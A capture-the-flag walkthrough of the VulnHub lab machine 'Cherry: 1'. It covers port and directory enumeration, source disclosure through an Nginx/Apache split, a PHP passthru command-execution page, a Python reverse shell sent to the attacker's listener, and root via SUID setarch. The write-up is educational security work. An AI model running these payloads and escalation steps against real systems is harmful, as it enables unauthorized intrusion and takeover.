# VulnHub > Cherry: 1

* Name: Cherry: 1
* Date release: 14 Sep 2020
* Author: SunCSR Team
* Series: Cherry
* Difficulty: Easy
* Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
* Goal: Get the root shell and then obtain flag under `/root`.

# Services enumeration

There are serveral open ports, including 2 web services, one involving Nginx (port `80`) and the other with Apache (port `7755`)

~~~
PORT   STATE SERVICE VERSION
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cherry
7755/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Cherry
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Web enumeration

## Backup directory

Enumerating the web service (port 80) with gobuster reveals the existence of a hidden `/backup` directory:

~~~
kali@kali:/data/CHERRY_1$ gobuster dir -u http://cherry.box/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cherry.box/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/21 08:32:20 Starting gobuster
===============================================================
/backup (Status: 301)
/index.html (Status: 200)
/info.php (Status: 200)
===============================================================
2020/09/21 08:32:20 Finished
===============================================================
~~~

## Source code disclosure

Accessing the `/backup` directory via the web browser reveals the files contained in it, as directory listing is enabled. Besides, there is a vulnerability due to the double web server Nginx/Apache. Indeed, Nginx has been configured to deliver static content only (e.g. `*.html` files), while Apache delivers dynamic content (e.g. `*.php` files). Hence, accessing a `*.php` file over port 80 will reveal its source content, as shown below:

~~~
kali@kali:/data/CHERRY_1/files/piranha.core-master$ curl http://cherry.box/info.php
<?php
phpinfo(); 
?>
~~~

## command.php

The `/backup` directory contains several useless compressed archives, but an interesting `command.php` file.

~~~
$ curl -s http://cherry.box:7755/backup/ | html2text 
****** Index of /backup ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       command.php      2020-09-07 03:30  293  
[[   ]]       latest.tar.gz    2020-09-01 18:54  12M  
[[   ]]       master.zip       2020-09-07 03:33  11M  
[[   ]]       master.zip.bak   2020-09-07 03:34  11M  
===========================================================================
     Apache/2.4.41 (Ubuntu) Server at cherry.box Port 7755
~~~

Browsing curl http://cherry.box/backup/command.php (port 80) will reveal the source code of `command.php`. This page will execute the command passed as argument (`$_GET['backup']`). 

```php
<?php echo passthru($_GET['backup']); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backup</title>
</head>
<body>
<!-- </?php echo passthru($_GET['backup']); ?/> -->
</body>
</html>
```

Below is an example of successful command execution:

~~~
$ curl -s http://cherry.box:7755/backup/command.php?backup=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Backup</title>
</head>
<body>
<!-- </?php echo passthru($_GET['backup']); ?/> -->
</body>
</html>
~~~

# Reverse shell

With this initial foothold, we can now prepare a reverse shell. Let's start a listener (`rlwrap nc -nlvp 4444`) and send the following command:

~~~
http://cherry.box:7755/backup/command.php?backup=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.16.222.128%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27
~~~

A reverse shell is spawned in our listener window:

~~~
kali@kali:/data/CHERRY_1/files/piranha.core-master$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.133] 49634
www-data@cherry:/var/www/html/backup$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Privesc

Listing the files owned by `root` with the SUID bit set reveals an interesting program:

~~~
www-data@cherry:/tmp$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/setarch <------ interesting executable!
[REDACTED]
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/setarch/) reveals that we can take advantage of it to elevate our privileges to `root` as the program has the SUID bit set:

~~~
www-data@cherry:/tmp$ /usr/bin/setarch $(arch) /bin/sh -p
/usr/bin/setarch $(arch) /bin/sh -p
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
~~~

# Root flag

Now elevated to `root`, we can get the root flag:

~~~
# cd /root
cd /root
# ls -la
ls -la
total 44
drwx------  5 root root 4096 Sep  7 04:21 .
drwxr-xr-x 20 root root 4096 Sep  7 02:18 ..
-rw-------  1 root root  164 Sep  7 04:21 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Sep  7 02:33 .local
-rw-------  1 root root   18 Sep  7 02:37 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Sep  7 02:21 .ssh
-rw-r--r--  1 root root  255 Sep  7 04:13 .wget-hsts
-rw-r--r--  1 root root   46 Sep  7 04:20 proof.txt
drwxr-xr-x  3 root root 4096 Sep  7 02:21 snap
# cat proof.txt
cat proof.txt
Sun_CSR_TEAM.af6d45da1f1181347b9e2139f23c6a5b
~~~
